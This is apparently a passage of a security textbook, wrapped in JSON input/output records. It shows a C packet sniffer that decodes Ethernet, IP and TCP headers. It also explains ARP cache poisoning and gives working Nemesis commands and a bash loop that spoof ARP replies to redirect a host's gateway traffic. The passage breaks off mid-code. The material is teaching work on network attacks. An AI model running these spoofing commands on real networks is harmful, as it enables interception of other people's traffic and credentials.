|\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Identification |Flags| Fragment Offset |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Time to Live | Protocol | Header Checksum |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Source Address |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Destination Address |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Options | Padding |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nExample Internet Datagram Header\nEach element in the structure corresponds to the fields shown in the\nRFC header diagram. Since the first two fields, Version and IHL (Internet\nHeader Length) are only four bits in size and there aren’t any 4-bit variable\ntypes in C, the Linux header definition splits the byte differently depending\non the byte order of the host. These fields are in the network byte order, so,\nif the host is little-endian, the IHL should come before Version since the byte\norder is reversed. For our purposes, we won’t really be using either of these\nfields, so we don’t even need to split up the byte.\nAdded to hacking-network.h\nstruct ip_hdr {\nunsigned char ip_version_and_header_length; // Version and header length\nunsigned char ip_tos; // Type of service\nunsigned short ip_len; // Total length\nunsigned short ip_id; // Identification number\nunsigned short ip_frag_offset; // Fragment offset and flags\nunsigned char ip_ttl; // Time to live\nunsigned char ip_type; // Protocol type\nunsigned short ip_checksum; // Checksum\nunsigned int ip_src_addr; // Source IP address\nunsigned int ip_dest_addr; // Destination IP address\n};\n232 0x400\nThe compiler padding, as mentioned earlier, will align this structure on\na 4-byte boundary by padding the rest of the structure. IP headers are always\n20 bytes.\nFor the TCP packet header, we reference /usr/include/netinet/tcp.h\nfor the structure and RFC 793 for the header diagram.\nFrom /usr/include/netinet/tcp.h\ntypedef u_int32_t tcp_seq;\n/*\n* TCP header.\n* Per RFC 793, September, 1981.\n*/\nstruct tcphdr\n{\nu_int16_t th_sport; /* source port */\nu_int16_t th_dport; /* destination port */\ntcp_seq th_seq; /* sequence number */\ntcp_seq th_ack; /* acknowledgment number */\n# if __BYTE_ORDER == __LITTLE_ENDIAN\nu_int8_t th_x2:4; /* (unused) */\nu_int8_t th_off:4; /* data offset */\n# endif\n# if __BYTE_ORDER == __BIG_ENDIAN\nu_int8_t th_off:4; /* data offset */\nu_int8_t th_x2:4; /* (unused) */\n# endif\nu_int8_t th_flags;\n# define TH_FIN 0x01\n# define TH_SYN 0x02\n# define TH_RST 0x04\n# define TH_PUSH 0x08\n# define TH_ACK 0x10\n# define TH_URG 0x20\nu_int16_t th_win; /* window */\nu_int16_t th_sum; /* checksum */\nu_int16_t th_urp; /* urgent pointer */\n};\nFrom RFC 793\nTCP Header Format\n0 1 2 3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Source Port | Destination Port |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Sequence Number |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Acknowledgment Number |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nNetworking 233\n| Data | |U|A|P|R|S|F| |\n| Offset| Reserved |R|C|S|S|Y|I| Window |\n| | |G|K|H|T|N|N| |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Checksum | Urgent Pointer |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Options | Padding |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| data |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nData Offset: 4 bits\nThe number of 32 bit words in the TCP Header. This indicates where\nthe data begins. The TCP header (even one including options) is an\nintegral number of 32 bits long.\nReserved: 6 bits\nReserved for future use. Must be zero.\nOptions: variable\nLinux’s tcphdr structure also switches the ordering of the 4-bit data offset\nfield and the 4-bit section of the reserved field depending on the host’s byte\norder. The data offset field is important, since it tells the size of the variable-\nlength TCP header. You might have noticed that Linux’s tcphdr structure\ndoesn’t save any space for TCP options. This is because the RFC defines this\nfield as optional. The size of the TCP header will always be 32-bit-aligned, and\nthe data offset tells us how many 32-bit words are in the header. So the TCP\nheader size in bytes equals the data offset field from the header times four.\nSince the data offset field is required to calculate the header size, we’ll split\nthe byte containing it, assuming little-endian host byte ordering.\nThe th_flags field of Linux’s tcphdr structure is defined as an 8-bit unsigned\ncharacter. The values defined below this field are the bitmasks that correspond\nto the six possible flags.\nAdded to hacking-network.h\nstruct tcp_hdr {\nunsigned short tcp_src_port; // Source TCP port\nunsigned short tcp_dest_port; // Destination TCP port\nunsigned int tcp_seq; // TCP sequence number\nunsigned int tcp_ack; // TCP acknowledgment number\nunsigned char reserved:4; // 4 bits from the 6 bits of reserved space\nunsigned char tcp_offset:4; // TCP data offset for little-endian host\nunsigned char tcp_flags; // TCP flags (and 2 bits from reserved space)\n#define TCP_FIN 0x01\n#define TCP_SYN 0x02\n#define TCP_RST 0x04\n#define TCP_PUSH 0x08\n#define TCP_ACK 0x10\n#define TCP_URG 0x20\nunsigned short tcp_window; // TCP window size\nunsigned short tcp_checksum; // TCP checksum\nunsigned short tcp_urgent; // TCP urgent pointer\n};\n234 0x400\nNow that the headers are defined as structures, we can write a program\nto decode the layered headers of each packet. But before we do, let’s talk\nabout libpcap for a moment. This library has a function called pcap_loop(),\nwhich is a better way to capture packets than just looping on a pcap_next()\ncall. Very few programs actually use pcap_next(), because it’s clumsy and\ninefficient. The pcap_loop() function uses a callback function. This means\nthepcap_loop() function is passed a function pointer, which is called every\ntime a packet is captured. The prototype for pcap_loop() is as follows:\nint pcap_loop(pcap_t *handle, int count, pcap_handler callback, u_char *args);\nThe first argument is the pcap’s handle, the next one is a count of how\nmany packets to capture, and the third is a function pointer to the callback\nfunction. If the count argument is set to -1, it will loop until the program\nbreaks out of it. The final argument is an optional pointer that will get\npassed to the callback function. Naturally, the callback function needs to\nfollow a certain prototype, since pcap_loop() must call this function. The\ncallback function can be named whatever you like, but the arguments must\nbe as follows:\nvoid callback(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet);\nThe first argument is just the optional argument pointer from the last\nargument to pcap_loop(). It can be used to pass additional information to the\ncallback function, but we aren’t going to be using this. The next two arguments\nshould be familiar from pcap_next(): a pointer to the capture header and a\npointer to the packet itself.\nThe following example code uses pcap_loop() with a callback function to\ncapture packets and our header structures to decode them. This program will\nbe explained as the code is listed.\ndecode_sniff.c\n#include <pcap.h>\n#include \"hacking.h\"\n#include \"hacking-network.h\"\nvoid pcap_fatal(const char *, const char *);\nvoid decode_ethernet(const u_char *);\nvoid decode_ip(const u_char *);\nu_int decode_tcp(const u_char *);\nvoid caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);\nint main() {\nstruct pcap_pkthdr cap_header;\nconst u_char *packet, *pkt_data;\nchar errbuf[PCAP_ERRBUF_SIZE];\nchar *device;\nNetworking 235\npcap_t *pcap_handle;\ndevice = pcap_lookupdev(errbuf);\nif(device == NULL)\npcap_fatal(\"pcap_lookupdev\", errbuf);\nprintf(\"Sniffing on device %s\\n\", device);\npcap_handle = pcap_open_live(device, 4096, 1, 0, errbuf);\nif(pcap_handle == NULL)\npcap_fatal(\"pcap_open_live\", errbuf);\npcap_loop(pcap_handle, 3, caught_packet, NULL);\npcap_close(pcap_handle);\n}\nAt the beginning of this program, the prototype for the callback func-\ntion, called caught_packet(), is declared along with several decoding functions.\nEverything else in main() is basically the same, except that the for loop has\nbeen replaced with a single call to pcap_loop(). This function is passed the\npcap_handle, told to capture three packets, and pointed to the callback func-\ntion, caught_packet(). The final argument is NULL, since we don’t have any addi-\ntional data to pass along to caught_packet(). Also, notice that the decode_tcp()\nfunction returns a u_int. Since the TCP header length is variable, this function\nreturns the length of the TCP header.\nvoid caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char\n*packet) {\nint tcp_header_length, total_header_size, pkt_data_len;\nu_char *pkt_data;\nprintf(\"==== Got a %d byte packet ====\\n\", cap_header->len);\ndecode_ethernet(packet);\ndecode_ip(packet+ETHER_HDR_LEN);\ntcp_header_length = decode_tcp(packet+ETHER_HDR_LEN+sizeof(struct ip_hdr));\ntotal_header_size = ETHER_HDR_LEN+sizeof(struct ip_hdr)+tcp_header_length;\npkt_data = (u_char *)packet + total_header_size; // pkt_data points to the data portion.\npkt_data_len = cap_header->len - total_header_size;\nif(pkt_data_len > 0) {\nprintf(\"\\t\\t\\t%u bytes of packet data\\n\", pkt_data_len);\ndump(pkt_data, pkt_data_len);\n} else\nprintf(\"\\t\\t\\tNo Packet Data\\n\");\n}\nvoid pcap_fatal(const char *failed_in, const char *errbuf) {\nprintf(\"Fatal Error in %s: %s\\n\", failed_in, errbuf);\nexit(1);\n}\n236 0x400\nThe caught_packet() function gets called whenever pcap_loop() captures a\npacket. This function uses the header lengths to split the packet up by layers\nand the decoding functions to print out details of each layer’s header.\nvoid decode_ethernet(const u_char *header_start) {\nint i;\nconst struct ether_hdr *ethernet_header;\nethernet_header = (const struct ether_hdr *)header_start;\nprintf(\"[[ Layer 2 :: Ethernet Header ]]\\n\");\nprintf(\"[ Source: %02x\", ethernet_header->ether_src_addr[0]);\nfor(i=1; i < ETHER_ADDR_LEN; i++)\nprintf(\":%02x\", ethernet_header->ether_src_addr[i]);\nprintf(\"\\tDest: %02x\", ethernet_header->ether_dest_addr[0]);\nfor(i=1; i < ETHER_ADDR_LEN; i++)\nprintf(\":%02x\", ethernet_header->ether_dest_addr[i]);\nprintf(\"\\tType: %hu ]\\n\", ethernet_header->ether_type);\n}\nvoid decode_ip(const u_char *header_start) {\nconst struct ip_hdr *ip_header;\nip_header = (const struct ip_hdr *)header_start;\nprintf(\"\\t(( Layer 3 ::: IP Header ))\\n\");\nprintf(\"\\t( Source: %s\\t\", inet_ntoa(ip_header->ip_src_addr));\nprintf(\"Dest: %s )\\n\", inet_ntoa(ip_header->ip_dest_addr));\nprintf(\"\\t( Type: %u\\t\", (u_int) ip_header->ip_type);\nprintf(\"ID: %hu\\tLength: %hu )\\n\", ntohs(ip_header->ip_id), ntohs(ip_header->ip_len));\n}\nu_int decode_tcp(const u_char *header_start) {\nu_int header_size;\nconst struct tcp_hdr *tcp_header;\ntcp_header = (const struct tcp_hdr *)header_start;\nheader_size = 4 * tcp_header->tcp_offset;\nprintf(\"\\t\\t{{ Layer 4 :::: TCP Header }}\\n\");\nprintf(\"\\t\\t{ Src Port: %hu\\t\", ntohs(tcp_header->tcp_src_port));\nprintf(\"Dest Port: %hu }\\n\", ntohs(tcp_header->tcp_dest_port));\nprintf(\"\\t\\t{ Seq #: %u\\t\", ntohl(tcp_header->tcp_seq));\nprintf(\"Ack #: %u }\\n\", ntohl(tcp_header->tcp_ack));\nprintf(\"\\t\\t{ Header Size: %u\\tFlags: \", header_size);\nif(tcp_header->tcp_flags & TCP_FIN)\nprintf(\"FIN \");\nif(tcp_header->tcp_flags & TCP_SYN)\nprintf(\"SYN \");\nif(tcp_header->tcp_flags & TCP_RST)\nprintf(\"RST \");\nif(tcp_header->tcp_flags & TCP_PUSH)\nprintf(\"PUSH \");\nif(tcp_header->tcp_flags & TCP_ACK)\nprintf(\"ACK \");\nNetworking 237\nif(tcp_header->tcp_flags & TCP_URG)\nprintf(\"URG \");\nprintf(\" }\\n\");\nreturn header_size;\n}\nThe decoding functions are passed a pointer to the start of the header,\nwhich is typecast to the appropriate structure. This allows accessing various\nfields of the header, but it’s important to remember these values will be in\nnetwork byte order. This data is straight from the wire, so the byte order\nneeds to be converted for use on an x86 processor.\nreader@hacking:~/booksrc $ gcc -o decode_sniff decode_sniff.c -lpcap\nreader@hacking:~/booksrc $ sudo ./decode_sniff\nSniffing on device eth0\n==== Got a 75 byte packet ====\n[[ Layer 2 :: Ethernet Header ]]\n[ Source: 00:01:29:15:65:b6 Dest: 00:01:6c:eb:1d:50 Type: 8 ]\n(( Layer 3 ::: IP Header ))\n( Source: 192.168.42.1 Dest: 192.168.42.249 )\n( Type: 6 ID: 7755 Length: 61 )\n{{ Layer 4 :::: TCP Header }}\n{ Src Port: 35602 Dest Port: 7890 }\n{ Seq #: 2887045274 Ack #: 3843058889 }\n{ Header Size: 32 Flags: PUSH ACK }\n9 bytes of packet data\n74 65 73 74 69 6e 67 0d 0a | testing..\n==== Got a 66 byte packet ====\n[[ Layer 2 :: Ethernet Header ]]\n[ Source: 00:01:6c:eb:1d:50 Dest: 00:01:29:15:65:b6 Type: 8 ]\n(( Layer 3 ::: IP Header ))\n( Source: 192.168.42.249 Dest: 192.168.42.1 )\n( Type: 6 ID: 15678 Length: 52 )\n{{ Layer 4 :::: TCP Header }}\n{ Src Port: 7890 Dest Port: 35602 }\n{ Seq #: 3843058889 Ack #: 2887045283 }\n{ Header Size: 32 Flags: ACK }\nNo Packet Data\n==== Got a 82 byte packet ====\n[[ Layer 2 :: Ethernet Header ]]\n[ Source: 00:01:29:15:65:b6 Dest: 00:01:6c:eb:1d:50 Type: 8 ]\n(( Layer 3 ::: IP Header ))\n( Source: 192.168.42.1 Dest: 192.168.42.249 )\n( Type: 6 ID: 7756 Length: 68 )\n{{ Layer 4 :::: TCP Header }}\n{ Src Port: 35602 Dest Port: 7890 }\n{ Seq #: 2887045283 Ack #: 3843058889 }\n{ Header Size: 32 Flags: PUSH ACK }\n16 bytes of packet data\n74 68 69 73 20 69 73 20 61 20 74 65 73 74 0d 0a | this is a test..\nreader@hacking:~/booksrc $\n238 0x400"
  },
  {
    "input": "0x444 Active Sniffing",
    "output": "With the headers decoded and separated into layers, the TCP/IP connec-\ntion is much easier to understand. Notice which IP addresses are associated with\nwhich MAC address. Also, notice how the sequence number in the two packets\nfrom 192.168.42.1 (the first and last packet) increases by nine, since the first\npacket contained nine bytes of actual data: 2887045283 – 2887045274 = 9.\nThis is used by the TCP protocol to make sure all of the data arrives in order,\nsince packets could be delayed for various reasons.\nDespite all of the mechanisms built into the packet headers, the packets\nare still visible to anyone on the same network segment. Protocols such as\nFTP, POP3, and telnet transmit data without encryption. Even without the\nassistance of a tool like dsniff, it’s fairly trivial for an attacker sniffing the\nnetwork to find the usernames and passwords in these packets and use them\nto compromise other systems. From a security perspective, this isn’t too good,\nso more intelligent switches provide switched network environments.\n0x444 Active Sniffing\nIn a switched network environment, packets are only sent to the port they are\ndestined for, according to their destination MAC addresses. This requires\nmore intelligent hardware that can create and maintain a table associating\nMAC addresses with certain ports, depending on which device is connected\nto each port, as illustrated here.\nThe advantage of a switched environment is that devices are only sent\npackets that are meant for them, so that promiscuous devices aren’t able to\nsniff any additional packets. But even in a switched environment, there are\nclever ways to sniff other devices’ packets; they just tend to be a bit more\ncomplex. In order to find hacks like these, the details of the protocols must\nbe examined and then combined.\nOne important aspect of network communications that can be manip-\nulated for interesting effects is the source address. There’s no provision in\nthese protocols to ensure that the source address in a packet really is the\naddress of the source machine. The act of forging a source address in a packet\nis known as spoofing. The addition of spoofing to your bag of tricks greatly\nincreases the number of possible hacks, since most systems expect the source\naddress to be valid.\nPort 1 00:00:00:AA:AA:AA\nPort 2 00:00:00:BB:BB:BB\nPort 3 00:00:00:CC:CC:CC\nSwitch\n1 2 3\n00:00:00:AA:AA:AA 00:00:00:BB:BB:BB 00:00:00:CC:CC:CC\nNetworking 239\nSpoofing is the first step in sniffing packets on a switched network. The\nother two interesting details are found in ARP. First, when an ARP reply comes\nin with an IP address that already exists in the ARP cache, the receiving system\nwill overwrite the prior MAC address information with the new information\nfound in the reply (unless that entry in the ARP cache was explicitly marked\nas permanent). Second, no state information about the ARP traffic is kept,\nsince this would require additional memory and would complicate a protocol\nthat is meant to be simple. This means systems will accept an ARP reply even\nif they didn’t send out an ARP request.\nThese three details, when exploited properly, allow an attacker to sniff\nnetwork traffic on a switched network using a technique known as ARP\nredirection. The attacker sends spoofed ARP replies to certain devices that cause\nthe ARP cache entries to be overwritten with the attacker’s data. This tech-\nnique is called ARP cache poisoning. In order to sniff network traffic between\ntwo points, A and B, the attacker needs to poison the ARP cache of A to\ncause A to believe that B’s IP address is at the attacker’s MAC address, and\nalso poison the ARP cache of B to cause B to believe that A’s IP address is also\nat the attacker’s MAC address. Then the attacker’s machine simply needs to\nforward these packets to their appropriate final destinations. After that, all\nofthe traffic between A and B still gets delivered, but it all flows through the\nattacker’s machine, as shown here.\nSystem A System B\nIP: 192.168.0.100 IP: 192.168.0.200\nMAC: 00:00:00:AA:AA:AA MAC: 00:00:00:BB:BB:BB\nInternal ARP cache Internal ARP cache\n192.168.0.200 at 00:00:00:FA:CA:DE 192.168.0.100 at 00:00:00:FA:CA:DE\nAttacker system\nIP: 192.168.0.137\nMAC: 00:00:00:FA:CA:DE\nTraffic to A\nInternal ARP cache\n192.168.0.100 at 00:00:00:AA:AA:AA Traffic to B\n192.168.0.22 at 00:00:00:BB:BB:BB\nSince A and B are wrapping their own Ethernet headers on their packets\nbased on their respective ARP caches, A’s IP traffic meant for B is actually sent\nto the attacker’s MAC address, and vice versa. The switch only filters traffic\nbased on MAC address, so the switch will work as it’s designed to, sending A’s\nand B’s IP traffic, destined for the attacker’s MAC address, to the attacker’s\nport. Then the attacker rewraps the IP packets with the proper Ethernet\nheaders and sends them back to the switch, where they are finally routed to\ntheir proper destination. The switch works properly; it’s the victim machines\nthat are tricked into redirecting their traffic through the attacker’s machine.\n240 0x400\nDue to timeout values, the victim machines will periodically send out real\nARP requests and receive real ARP replies in response. In order to maintain\nthe redirection attack, the attacker must keep the victim machine’s ARP caches\npoisoned. A simple way to accomplish this is to send spoofed ARP replies to\nboth A and B at a constant interval—for example, every 10 seconds.\nA gateway is a system that routes all the traffic from a local network out to\nthe Internet. ARP redirection is particularly interesting when one of the victim\nmachines is the default gateway, since the traffic between the default gateway\nand another system is that system’s Internet traffic. For example, if a machine\nat 192.168.0.118 is communicating with the gateway at 192.168.0.1 over a\nswitch, the traffic will be restricted by MAC address. This means that this\ntraffic cannot normally be sniffed, even in promiscuous mode. In order to\nsniff this traffic, it must be redirected.\nTo redirect the traffic, first the MAC addresses of 192.168.0.118 and\n192.168.0.1 need to be determined. This can be done by pinging these hosts,\nsince any IP connection attempt will use ARP. If you run a sniffer, you can\nsee the ARP communications, but the OS will cache the resulting IP/MAC\naddress associations.\nreader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.1\nPING 192.168.0.1 (192.168.0.1): 56 octets data\n64 octets from 192.168.0.1: icmp_seq=0 ttl=64 time=0.4 ms\n--- 192.168.0.1 ping statistics ---\n1 packets transmitted, 1 packets received, 0% packet loss\nround-trip min/avg/max = 0.4/0.4/0.4 ms\nreader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.118\nPING 192.168.0.118 (192.168.0.118): 56 octets data\n64 octets from 192.168.0.118: icmp_seq=0 ttl=128 time=0.4 ms\n--- 192.168.0.118 ping statistics ---\n1 packets transmitted, 1 packets received, 0% packet loss\nround-trip min/avg/max = 0.4/0.4/0.4 ms\nreader@hacking:~/booksrc $ arp -na\n? (192.168.0.1) at 00:50:18:00:0F:01 [ether] on eth0\n? (192.168.0.118) at 00:C0:F0:79:3D:30 [ether] on eth0\nreader@hacking:~/booksrc $ ifconfig eth0\neth0 Link encap:Ethernet HWaddr 00:00:AD:D1:C7:ED\ninet addr:192.168.0.193 Bcast:192.168.0.255 Mask:255.255.255.0\nUP BROADCAST NOTRAILERS RUNNING MTU:1500 Metric:1\nRX packets:4153 errors:0 dropped:0 overruns:0 frame:0\nTX packets:3875 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:100\nRX bytes:601686 (587.5 Kb) TX bytes:288567 (281.8 Kb)\nInterrupt:9 Base address:0xc000\nreader@hacking:~/booksrc $\nAfter pinging, the MAC addresses for both 192.168.0.118 and 192.168.0.1\nare in the attacker’s ARP cache. This way, packets can reach their final\ndestinations after being redirected to the attacker’s machine. Assuming IP\nforwarding capabilities are compiled into the kernel, all we need to do is\nsend some spoofed ARP replies at regular intervals. 192.168.0.118 needs to\nbe told that 192.168.0.1 is at 00:00:AD:D1:C7:ED, and 192.168.0.1 needs to be\nNetworking 241\ntold that 192.168.0.118 is also at 00:00:AD:D1:C7:ED. These spoofed ARP packets\ncan be injected using a command-line packet injection tool called Nemesis.\nNemesis was originally a suite of tools written by Mark Grimes, but in the\nmost recent version 1.4, all functionality has been rolled up into a single\nutility by the new maintainer and developer, Jeff Nathan. The source code\nfor Nemesis is on the LiveCD at /usr/src/nemesis-1.4/, and it has already\nbeen built and installed.\nreader@hacking:~/booksrc $ nemesis\nNEMESIS -=- The NEMESIS Project Version 1.4 (Build 26)\nNEMESIS Usage:\nnemesis [mode] [options]\nNEMESIS modes:\narp\ndns\nethernet\nicmp\nigmp\nip\nospf (currently non-functional)\nrip\ntcp\nudp\nNEMESIS options:\nTo display options, specify a mode with the option \"help\".\nreader@hacking:~/booksrc $ nemesis arp help\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\nARP/RARP Usage:\narp [-v (verbose)] [options]\nARP/RARP Options:\n-S <Source IP address>\n-D <Destination IP address>\n-h <Sender MAC address within ARP frame>\n-m <Target MAC address within ARP frame>\n-s <Solaris style ARP requests with target hardware addess set to broadcast>\n-r ({ARP,RARP} REPLY enable)\n-R (RARP enable)\n-P <Payload file>\nData Link Options:\n-d <Ethernet device name>\n-H <Source MAC address>\n-M <Destination MAC address>\nYou must define a Source and Destination IP address.\n242 0x400\nreader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D\n192.168.0.118 -h 00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -\nM 00:C0:F0:79:3D:30\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n[MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30\n[Ethernet type] ARP (0x0806)\n[Protocol addr:IP] 192.168.0.1 > 192.168.0.118\n[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30\n[ARP opcode] Reply\n[ARP hardware fmt] Ethernet (1)\n[ARP proto format] IP (0x0800)\n[ARP protocol len] 6\n[ARP hardware len] 4\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB\nARP Packet Injected\nreader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D\n192.168.0.1 -h 00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M\n00:50:18:00:0F:01\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n[MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01\n[Ethernet type] ARP (0x0806)\n[Protocol addr:IP] 192.168.0.118 > 192.168.0.1\n[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01\n[ARP opcode] Reply\n[ARP hardware fmt] Ethernet (1)\n[ARP proto format] IP (0x0800)\n[ARP protocol len] 6\n[ARP hardware len] 4\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.\nARP Packet Injected\nreader@hacking:~/booksrc $\nThese two commands spoof ARP replies from 192.168.0.1 to 192.168.0.118\nand vice versa, both claiming that their MAC address is at the attacker’s MAC\naddress of 00:00:AD:D1:C7:ED. If these commands are repeated every 10 seconds,\nthese bogus ARP replies will continue to keep the ARP caches poisoned and\nthe traffic redirected. The standard BASH shell allows commands to be\nscripted, using familiar control flow statements. A simple BASH shell while\nloop is used below to loop forever, sending our two poisoning ARP replies\nevery 10 seconds.\nreader@hacking:~/booksrc $ while true\n> do\nNetworking 243\n> sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h\n00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M\n00:C0:F0:79:3D:30\n> sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D 192.168.0.1 -h\n00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M\n00:50:18:00:0F:01\n> echo \"Redirecting...\"\n> sleep 10\n> done\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n[MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30\n[Ethernet type] ARP (0x0806)\n[Protocol addr:IP] 192.168.0.1 > 192.168.0.118\n[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30\n[ARP opcode] Reply\n[ARP hardware fmt] Ethernet (1)\n[ARP proto format] IP (0x0800)\n[ARP protocol len] 6\n[ARP hardware len] 4\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.\nARP Packet Injected\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n[MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01\n[Ethernet type] ARP (0x0806)\n[Protocol addr:IP] 192.168.0.118 > 192.168.0.1\n[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01\n[ARP opcode] Reply\n[ARP hardware fmt] Ethernet (1)\n[ARP proto format] IP (0x0800)\n[ARP protocol len] 6\n[ARP hardware len] 4\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.\nARP Packet Injected\nRedirecting...\nYou can see how something as simple as Nemesis and the standard BASH\nshell can be used to quickly hack together a network exploit. Nemesis uses a\nC library called libnet to craft spoofed packets and inject them. Similar to\nlibpcap, this library uses raw sockets and evens out the inconsistencies between\nplatforms with a standardized interface. libnet also provides several convenient\nfunctions for dealing with network packets, such as checksum generation.\nThe libnet library provides a simple and uniform API to craft and inject\nnetwork packets. It’s well documented and the functions have descriptive\nnames. A high-level glance at the source code for Nemesis shows how easy it\nis to craft ARP packets using libnet. The source file nemesis-arp.c contains\nseveral functions for crafting and injecting ARP packets, using statically defined\n244 0x400\ndata structures for the packet header information. The nemesis_arp() function\nshown below is called in nemesis.c to build and inject an ARP packet.\nFrom nemesis-arp.c\nstatic ETHERhdr etherhdr;\nstatic ARPhdr arphdr;\n...\nvoid nemesis_arp(int argc, char **argv)\n{\nconst char *module= \"ARP/RARP Packet Injection\";\nnemesis_maketitle(title, module, version);\nif (argc > 1 && !strncmp(argv[1], \"help\", 4))\narp_usage(argv[0]);\narp_initdata();\narp_cmdline(argc, argv);\narp_validatedata();\narp_verbose();\nif (got_payload)\n{\nif (builddatafromfile(ARPBUFFSIZE, &pd, (const char *)file,\n(const u_int32_t)PAYLOADMODE) < 0)\narp_exit(1);\n}\nif (buildarp(&etherhdr, &arphdr, &pd, device, reply) < 0)\n{\nprintf(\"\\n%s Injection Failure\\n\", (rarp == 0 ? \"ARP\" : \"RARP\"));\narp_exit(1);\n}\nelse\n{\nprintf(\"\\n%s Packet Injected\\n\", (rarp == 0 ? \"ARP\" : \"RARP\"));\narp_exit(0);\n}\n}\nThe structures ETHERhdr and ARPhdr are defined in the file nemesis.h (shown\nbelow) as aliases for existing libnet data structures. In C, typedef is used to alias\na data type with a symbol.\nFrom nemesis.h\ntypedef struct libnet_arp_hdr ARPhdr;\ntypedef struct libnet_as_lsa_hdr ASLSAhdr;\ntypedef struct libnet_auth_hdr AUTHhdr;\ntypedef struct libnet_dbd_hdr DBDhdr;\nNetworking 245\ntypedef struct libnet_dns_hdr DNShdr;\ntypedef struct libnet_ethernet_hdr ETHERhdr;\ntypedef struct libnet_icmp_hdr ICMPhdr;\ntypedef struct libnet_igmp_hdr IGMPhdr;\ntypedef struct libnet_ip_hdr IPhdr;\nThe nemesis_arp() function calls a series of other functions from this file:\narp_initdata(), arp_cmdline(), arp_validatedata(), and arp_verbose(). You can\nprobably guess that these functions initialize data, process command-line argu-\nments, validate data, and do some sort of verbose reporting. The arp_initdata()\nfunction does exactly this, initializing values in statically declared data\nstructures.\nThe arp_initdata() function, shown below, sets various elements of the\nheader structures to the appropriate values for an ARP packet.\nFrom nemesis-arp.c\nstatic void arp_initdata(void)\n{\n/* defaults */\netherhdr.ether_type = ETHERTYPE_ARP; /* Ethernet type ARP */\nmemset(etherhdr.ether_shost, 0, 6); /* Ethernet source address */\nmemset(etherhdr.ether_dhost, 0xff, 6); /* Ethernet destination address */\narphdr.ar_op = ARPOP_REQUEST; /* ARP opcode: request */\narphdr.ar_hrd = ARPHRD_ETHER; /* hardware format: Ethernet */\narphdr.ar_pro = ETHERTYPE_IP; /* protocol format: IP */\narphdr.ar_hln = 6; /* 6 byte hardware addresses */\narphdr.ar_pln = 4; /* 4 byte protocol addresses */\nmemset(arphdr.ar_sha, 0, 6); /* ARP frame sender address */\nmemset(arphdr.ar_spa, 0, 4); /* ARP sender protocol (IP) addr */\nmemset(arphdr.ar_tha, 0, 6); /* ARP frame target address */\nmemset(arphdr.ar_tpa, 0, 4); /* ARP target protocol (IP) addr 